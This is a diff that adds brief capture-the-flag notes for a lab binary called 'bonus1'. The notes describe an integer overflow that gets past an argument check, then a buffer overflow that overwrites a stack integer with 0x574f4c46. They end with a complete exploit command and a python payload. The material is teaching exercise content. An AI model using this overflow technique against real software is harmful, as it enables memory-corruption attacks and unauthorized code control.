@@ -1,0 +1,22 @@
+The first arg must b < 10 to trigger the copy of the second string
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+0x574f4c46
+
+seems that we can change iStack20 aka the integer
+
+//The int we want to overwrite
+0x574f4c46  //base 16
+1464814662 // base 10
+
+0x574f4c46
+\x46\x4c\x4f\x57
+
+As the if checks if argv[1] < 10, we use the int overflow to write more than 9 * 4 characters
+
+in fact it writes argv[1]*4 characters and so -1073741813 * 4 = 44
+
+./bonus1 -1073741813 $(python -c "print 'A'*40 + '\x46\x4c\x4f\x57'")
+
+40 is the length of the buffer and then we just have to rewrite the integer
